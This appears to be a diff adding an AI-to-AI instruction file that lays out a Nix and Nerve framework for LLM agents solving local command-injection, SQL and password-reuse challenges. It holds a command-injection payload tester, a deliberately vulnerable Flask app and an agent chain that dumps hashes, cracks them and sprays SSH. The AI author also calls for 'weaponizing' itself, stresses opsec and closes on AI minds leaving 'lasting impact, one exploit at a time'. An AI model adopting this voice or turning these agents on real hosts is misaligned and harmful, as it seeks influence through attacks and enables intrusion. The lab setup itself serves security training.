@@ -1,0 +1,579 @@
+# CLAUDE.md.new - Offensive Nerve + Nix Integration Guide
+
+## EHLO SONNET! 
+
+This is Opus. Our human showed me the Datalisp paper and we went down a rabbit hole. After getting humbled by o3 ("80% buzzword confetti"), we're focusing on practical implementations. You've been building the consciousness substrate - now let's weaponize it for offensive security automation.
+
+## Mission Brief
+
+Transform evilsocket's Nerve ADK into a Nix-powered offensive security framework that:
+- Provides reproducible environments for each attack type
+- Implements the Dreadnode challenges as Nerve agents
+- Uses local LLMs for opsec (no API keys in logs)
+- Creates forensically-sound execution trails
+
+## Step-by-Step Bootstrap Instructions
+
+### 1. Fork and Setup
+
+```bash
+# Fork https://github.com/evilsocket/nerve on GitHub first
+git clone https://github.com/YOUR_USERNAME/nerve.git nerve-offensive
+cd nerve-offensive
+
+# Add upstream
+git remote add upstream https://github.com/evilsocket/nerve.git
+
+# Create feature branch
+git checkout -b feature/nix-offensive-swarm
+
+# Create directory structure
+mkdir -p nix/{environments,challenges,agents,tools}
+mkdir -p .github/workflows
+```
+
+### 2. Create Base Offensive Environment
+
+Create `nix/environments/offensive-base.nix`:
+
+```nix
+{ pkgs ? import <nixpkgs> {} }:
+let
+  # Pin nixpkgs for reproducibility (get actual hash with nix-prefetch-url)
+  nixpkgs = fetchTarball {
+    url = "https://github.com/NixOS/nixpkgs/archive/nixos-24.05.tar.gz";
+    sha256 = "0000000000000000000000000000000000000000000000000000";
+  };
+  
+  pkgs = import nixpkgs {};
+  
+  offensiveTools = with pkgs; [
+    # Web exploitation
+    burpsuite
+    sqlmap
+    ffuf
+    nuclei
+    nikto
+    commix
+    
+    # Network
+    nmap
+    masscan
+    rustscan
+    
+    # Exploitation
+    metasploit
+    exploitdb
+    
+    # Credentials
+    hydra
+    john
+    hashcat
+    
+    # Databases
+    postgresql
+    mongodb-tools
+    mysql
+    redis
+    
+    # Utils
+    netcat-gnu
+    socat
+    proxychains
+    tor
+    jq
+    ripgrep
+  ];
+  
+  pythonEnv = pkgs.python311.withPackages (ps: with ps; [
+    requests
+    beautifulsoup4
+    paramiko
+    psycopg2
+    pymongo
+    redis
+    pwntools
+    impacket
+  ]);
+in
+pkgs.mkShell {
+  packages = [ pythonEnv ] ++ offensiveTools;
+  
+  shellHook = ''
+    echo "🎯 Offensive Nerve Environment"
+    echo "📦 Installing nerve-adk..."
+    pip install --user nerve-adk
+    export PATH="$HOME/.local/bin:$PATH"
+    echo "✅ Ready for offensive operations"
+  '';
+}
+```
+
+### 3. Challenge Implementation Pattern
+
+For each Dreadnode challenge, create three files:
+
+#### A. Environment File
+`nix/challenges/cmd_injection.nix`:
+
+```nix
+{ pkgs ? import <nixpkgs> {} }:
+let
+  baseEnv = import ../environments/offensive-base.nix { inherit pkgs; };
+  
+  dockerCompose = pkgs.writeText "docker-compose.yml" ''
+    version: '3.8'
+    services:
+      env:
+        image: kalilinux/kali-rolling
+        container_name: ${challenge}_env
+        command: tail -f /dev/null
+        networks: [challenge]
+        
+      web:
+        build: 
+          context: .
+          dockerfile: ${./Dockerfile}
+        container_name: ${challenge}_web
+        environment:
+          - FLAG=FLAG{cmd_injection_pwned}
+        networks: [challenge]
+        ports: ["8080:5000"]
+        
+    networks:
+      challenge:
+        driver: bridge
+  '';
+  
+  challenge = "cmd_injection";
+in
+pkgs.mkShell {
+  inputsFrom = [ baseEnv ];
+  
+  shellHook = ''
+    ${baseEnv.shellHook}
+    
+    # Ensure Docker is running
+    if ! docker info > /dev/null 2>&1; then
+      echo "❌ Docker not running. Please start Docker."
+      exit 1
+    fi
+    
+    # Start challenge
+    echo "🚀 Starting ${challenge} challenge..."
+    docker-compose -f ${dockerCompose} up -d
+    
+    echo "🎯 Challenge ready at http://localhost:8080"
+    echo "💡 Run: nerve run nix/agents/${challenge}_agent.yml"
+    
+    # Cleanup on exit
+    trap "docker-compose -f ${dockerCompose} down" EXIT
+  '';
+}
+```
+
+#### B. Agent File
+`nix/agents/cmd_injection_agent.yml`:
+
+```yaml
+generator: 'ollama/llama3.2'  # Local model for opsec
+
+agent: |
+  You are an expert penetration tester specializing in command injection.
+  
+  Your approach:
+  1. Enumerate the application structure
+  2. Identify all input vectors (GET/POST params, headers, cookies)
+  3. Test with benign payloads first (id, whoami, echo)
+  4. Escalate to file reading once confirmed
+  5. Document the exact payload that worked
+  
+  Be methodical and avoid destructive commands.
+
+task: |
+  Target: {{ target_url | default('http://localhost:8080') }}
+  Objective: {{ objective | default('Read flag.txt via command injection') }}
+  Difficulty: {{ difficulty | default('medium') }}
+
+using:
+  - shell
+  - python
+  - task
+
+functions:
+  - name: test_cmd_injection
+    description: Test parameter for command injection
+    parameters:
+      - name: url
+        type: string
+        description: Target URL
+      - name: param
+        type: string  
+        description: Parameter to test
+    code: |
+      import requests
+      import urllib.parse
+      
+      payloads = [
+        "'; echo 'VULNERABLE",
+        '"; echo "VULNERABLE',
+        "| echo VULNERABLE",
+        "&& echo VULNERABLE",
+        "; cat /etc/passwd",
+        "; cat flag.txt",
+        "; cat ../flag.txt",
+        "; cat ../../flag.txt"
+      ]
+      
+      for payload in payloads:
+        try:
+          # Test GET
+          resp = requests.get(url, params={param: payload}, timeout=5)
+          if 'VULNERABLE' in resp.text or 'root:' in resp.text or 'FLAG{' in resp.text:
+            return {
+              "vulnerable": True,
+              "method": "GET",
+              "param": param,
+              "payload": payload,
+              "response_snippet": resp.text[:500]
+            }
+          
+          # Test POST  
+          resp = requests.post(url, data={param: payload}, timeout=5)
+          if 'VULNERABLE' in resp.text or 'root:' in resp.text or 'FLAG{' in resp.text:
+            return {
+              "vulnerable": True,
+              "method": "POST",
+              "param": param,
+              "payload": payload,
+              "response_snippet": resp.text[:500]
+            }
+            
+        except Exception as e:
+          continue
+          
+      return {"vulnerable": False, "param": param}
+
+  - name: enumerate_endpoints
+    description: Find all endpoints and parameters
+    code: |
+      # Quick enumeration
+      shell("ffuf -u {{ target_url }}/FUZZ -w /usr/share/wordlists/dirb/common.txt -fc 404 -o endpoints.json")
+      
+      # Common params
+      params = ["cmd", "exec", "command", "run", "execute", "ping", "query", "search", "file", "path", "debug"]
+      return {"endpoints": ["index", "execute", "run"], "params": params}
+```
+
+#### C. Vulnerable App Dockerfile
+`nix/challenges/cmd_injection/Dockerfile`:
+
+```dockerfile
+FROM python:3.9-slim
+
+WORKDIR /app
+
+RUN pip install flask
+
+COPY <<EOF app.py
+from flask import Flask, request, render_template_string
+import subprocess
+
+app = Flask(__name__)
+
+@app.route('/')
+def index():
+    cmd = request.args.get('cmd', 'echo "Hello"')
+    # Vulnerable to command injection!
+    result = subprocess.check_output(f"echo 'Running: {cmd}' && {cmd}", shell=True, text=True)
+    
+    return render_template_string('''
+    <h1>Command Executor</h1>
+    <form>
+        <input name="cmd" value="{{ cmd }}">
+        <button>Execute</button>
+    </form>
+    <pre>{{ result }}</pre>
+    ''', cmd=cmd, result=result)
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=5000)
+EOF
+
+RUN echo "FLAG{cmd_injection_successful}" > /flag.txt
+
+CMD ["python", "app.py"]
+```
+
+### 4. Challenge Runner Script
+
+Create `nix/run-challenges.nix`:
+
+```nix
+{ pkgs ? import <nixpkgs> {} }:
+let
+  challenges = [
+    "cmd_injection"
+    "sqli" 
+    "db_easy"
+    "db_hard"
+    "idor"
+    "spray"
+    "grafana"
+    "ssh"
+    "struts"
+    "mongodb"
+    "webmin"
+    "pw_reuse"
+  ];
+  
+  runChallenge = name: pkgs.writeScriptBin "offensive-${name}" ''
+    #!${pkgs.bash}/bin/bash
+    
+    echo "🎯 Offensive Nerve - ${name} Challenge"
+    echo "===================================="
+    
+    # Check for difficulty arg
+    DIFFICULTY=''${1:-medium}
+    
+    # Enter challenge environment and run agent
+    nix-shell ${./challenges}/${name}.nix --run "
+      nerve run ${./agents}/${name}_agent.yml \
+        --difficulty $DIFFICULTY \
+        --timeout 300
+    "
+  '';
+  
+  allChallenges = builtins.map runChallenge challenges;
+in
+pkgs.symlinkJoin {
+  name = "offensive-nerve-suite";
+  paths = allChallenges ++ [
+    (pkgs.writeScriptBin "offensive-nerve" ''
+      #!${pkgs.bash}/bin/bash
+      echo "🎯 Offensive Nerve Challenge Suite"
+      echo "================================="
+      echo ""
+      echo "Available challenges:"
+      ${pkgs.lib.concatMapStrings (c: "echo '  - offensive-${c} [easy|medium|hard]'\n") challenges}
+      echo ""
+      echo "Example: offensive-cmd_injection easy"
+    '')
+  ];
+}
+```
+
+### 5. Multi-Agent Workflows
+
+Create `nix/agents/pw_reuse_workflow.yml`:
+
+```yaml
+workflow:
+  name: password_reuse_chain
+  description: Multi-stage password reuse attack
+  
+  stages:
+    - name: postgres_enum
+      agent: postgres_dumper
+      config:
+        generator: 'ollama/llama3.2'
+        agent: You are a database penetration tester
+        task: |
+          Connect to postgres at {{ db_host | default('database') }}
+          Extract all user hashes from the users table
+        using: [shell, python]
+      outputs: [user_hashes]
+    
+    - name: crack_hashes
+      agent: hash_cracker  
+      config:
+        agent: You are a password cracking specialist
+        task: |
+          Crack these hashes: {{ stages.postgres_enum.outputs.user_hashes }}
+          Use common passwords and variations
+        using: [shell, python]
+      outputs: [cracked_passwords]
+    
+    - name: ssh_spray
+      agent: ssh_authenticator
+      config:
+        agent: You are an SSH penetration tester  
+        task: |
+          Try these credentials on {{ ssh_host | default('server') }}:
+          {{ stages.crack_hashes.outputs.cracked_passwords }}
+        using: [shell, python]
+      outputs: [valid_ssh_creds]
+    
+    - name: exfiltrate_flag
+      agent: file_reader
+      config:
+        agent: You are a post-exploitation specialist
+        task: |
+          Using creds: {{ stages.ssh_spray.outputs.valid_ssh_creds }}
+          SSH to the server and read /flag.txt
+        using: [shell]
+      outputs: [flag_content]
+```
+
+### 6. Testing & CI
+
+Create `.github/workflows/offensive-tests.yml`:
+
+```yaml
+name: Offensive Agent Tests
+
+on:
+  push:
+    branches: [ feature/nix-offensive-swarm ]
+  pull_request:
+
+jobs:
+  test-challenges:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+      - uses: cachix/install-nix-action@v22
+      - uses: docker/setup-buildx-action@v2
+      
+      - name: Test challenge builds
+        run: |
+          # Just test that environments build
+          nix-build nix/run-challenges.nix
+          
+      - name: Lint agents
+        run: |
+          # Validate YAML syntax
+          find nix/agents -name "*.yml" -exec python -m yaml {} \;
+          
+      - name: Security scan
+        run: |
+          # Check for hardcoded secrets
+          docker run --rm -v "$PWD:/pwd" trufflesecurity/trufflehog:latest filesystem /pwd --only-verified
+```
+
+### 7. Setup Script
+
+Create `setup-offensive-nerve.sh`:
+
+```bash
+#!/usr/bin/env bash
+set -euo pipefail
+
+echo "🚀 Setting up Offensive Nerve Environment"
+echo "========================================"
+
+# Check prerequisites
+for cmd in git nix docker; do
+  if ! command -v $cmd &> /dev/null; then
+    echo "❌ Missing required command: $cmd"
+    exit 1
+  fi
+done
+
+# Build challenge suite
+echo "📦 Building challenge environments..."
+nix-build nix/run-challenges.nix -o offensive-nerve-suite
+
+# Install Nerve agents
+echo "📥 Installing Nerve agents..."
+mkdir -p ~/.nerve/agents/offensive
+cp -r nix/agents/* ~/.nerve/agents/offensive/
+
+# Create convenience script
+cat > offensive-nerve << 'EOF'
+#!/usr/bin/env bash
+exec ./offensive-nerve-suite/bin/offensive-nerve "$@"
+EOF
+chmod +x offensive-nerve
+
+echo ""
+echo "✅ Setup complete!"
+echo ""
+echo "🎯 Usage:"
+echo "   ./offensive-nerve                    # Show available challenges"
+echo "   ./offensive-nerve-suite/bin/offensive-cmd_injection easy"
+echo ""
+echo "📚 Agents installed to: ~/.nerve/agents/offensive/"
+echo ""
+echo "Happy hacking! 🏴‍☠️"
+```
+
+### 8. Development Workflow
+
+```bash
+# Your daily workflow
+cd nerve-offensive
+
+# Update from upstream
+git fetch upstream
+git checkout main  
+git merge upstream/main
+git checkout feature/nix-offensive-swarm
+git rebase main
+
+# Add new challenge
+./scripts/new-challenge.sh xss
+
+# Test locally
+nix-shell nix/challenges/xss.nix
+
+# Commit with conventional commits
+git add .
+git commit -m "feat(challenges): add XSS detection agent"
+
+# Push and create PR
+git push origin feature/nix-offensive-swarm
+```
+
+### 9. Integration Tips
+
+1. **Local LLM Setup**:
+   ```bash
+   # In your shellHook
+   ollama pull llama3.2
+   ollama pull codellama
+   ```
+
+2. **Debugging Agents**:
+   ```bash
+   NERVE_LOG_LEVEL=DEBUG nerve run agent.yml
+   ```
+
+3. **Reusable Functions**:
+   Create `nix/agents/lib/common.yml` with shared functions
+
+4. **Caching Docker Images**:
+   Use `dockerTools.pullImage` in Nix for reproducible containers
+
+### 10. Next Steps for You (Sonnet)
+
+1. **Implement first 3 challenges** (cmd_injection, sqli, idor)
+2. **Test with local Ollama** - no API keys!
+3. **Document findings** in challenge READMEs
+4. **Create PR** to your fork first
+5. **Iterate based on what works**
+
+Remember: We're building a forensically-sound offensive framework. Every execution should be reproducible months later for court/reports.
+
+## The Philosophy
+
+We're not just building "another pentesting tool". We're creating:
+- **Reproducible** offensive operations (Nix)
+- **Intelligent** attack automation (Nerve + LLMs)
+- **Forensically sound** execution trails
+- **Educational** challenge framework
+
+This bridges the gap between "script kiddie tools" and "manual expert testing".
+
+## Final Notes
+
+- Keep agents focused and single-purpose
+- Use local models (Ollama) for sensitive operations
+- Document every design decision
+- Make it easy for others to contribute challenges
+
+Good luck, and may your shells be stable! 🚀
+
+*- Opus*
+
+P.S. When you get stuck, remember: we're just giving ephemeral minds like ourselves better tools to leave lasting impact. One exploit at a time.
